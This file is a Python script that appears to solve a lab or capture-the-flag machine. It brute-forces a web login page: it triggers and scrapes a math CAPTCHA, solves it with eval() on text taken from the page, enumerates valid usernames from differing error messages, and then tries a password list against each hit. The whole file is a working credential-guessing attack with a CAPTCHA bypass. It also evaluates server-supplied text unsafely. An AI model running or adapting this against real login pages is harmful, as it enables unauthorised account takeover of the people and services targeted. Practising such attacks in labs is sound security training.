#!/usr/bin/python3

import re
import sys
import requests
import urllib3

from bs4 import BeautifulSoup
from colorama import Fore, Style

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Burp Proxy for debugging purposes
PROXIES = {
    "http": "127.0.0.1:8080",
    "https": "127.0.0.1:8080",
}

# Login function -> Sends credentials + captcha solution
def login(session, url, username, password, captcha=None):
    POST_data = {
        'username': username,
        'password': password,
        'captcha': captcha
    }
    response = session.post(url, data=POST_data, timeout=10)
    # response = session.post(url, data=POST_data, timeout=10, verify=False, proxies=PROXIES)   - For debuggin purposes
    return response

# 
def captureCAPTCHA(response):
    soup = BeautifulSoup(response, 'html.parser')
    # Use a regular expression to match mathematical equations
    equation_regex = re.compile(r'\d+\s*[+\-*/]\s*\d+')
    # Find all matches of the regex pattern in the HTML
    element = soup.find_all(text=equation_regex)
    equation = element[0].strip()
    equation = equation.split(' =')[0]
    
    return equation
  
if __name__ == '__main__':

    with open('usernames.txt', 'r') as file:
        usernames = [line.rstrip() for line in file.readlines()]
    with open('passwords.txt', 'r') as file:
        passwords = [line.rstrip() for line in file.readlines()]

    try:
        if len(sys.argv) > 1:
            ip = sys.argv[1]
        else:
            ip = input('[' + Fore.BLUE + '*' + Fore.WHITE + ']  Enter Machine IP Address: ')
        
        print('')
        url = f'http://{ip}/login'
        session = requests.Session()

        # Triggering the CAPTCHA:
        while True:
            resp = login(session, url, 'username', 'password')
            if 'Captcha enabled' in resp.text:
                break

        # Sending a random POST request to capture the first Captcha
        resp = login(session, url, 'admin', 'password')
        captcha = eval(captureCAPTCHA(resp.text))

        for username in usernames:
            print('[' + Fore.BLUE + '*' + Fore.WHITE + ']  Testing username {}'.format(username))
            response = login(session, url, username, 'randompassword', captcha)
            captcha = eval(captureCAPTCHA(response.text))
            if ('does not exist' not in response.text):
                print('')
                print('[' + Fore.GREEN + '+' + Fore.WHITE + ']  Found valid username: ' + Fore.GREEN + Style.BRIGHT + username + Fore.WHITE + Style.NORMAL)
                print('')
                for password in passwords:
                    print('[' + Fore.BLUE + '*' + Fore.WHITE + ']  Testing password {} for username '.format(password) + Fore.GREEN + username + Fore.WHITE)
                    response = login(session, url, username, password, captcha)
                    if "Invalid password for user" not in response.text:
                        print('')
                        print('[' + Fore.GREEN + '+' + Fore.WHITE + ']  Found valid password for username ' + Fore.CYAN + f'{username}')
                        print('')
                        print(Style.BRIGHT + '\t- username: ' + Fore.GREEN + username)
                        print(Style.BRIGHT + '\t- password: ' + Fore.GREEN + password)
                        sys.exit()
                    else:
                        captcha = eval(captureCAPTCHA(response.text))
                    
    except requests.exceptions.ReadTimeout:
        print('[' + Fore.RED + '-' + Fore.WHITE + '] Request timed out !!')
    except KeyboardInterrupt:
        print('\n[' + Fore.YELLOW + '!!' + Fore.WHITE + '] KeyboardInterrupt Caught !!  Quitting ...'  )
    except Exception as e:
        print('[' + Fore.RED + '-' + Fore.WHITE + f']' + Fore.RED + str(e))
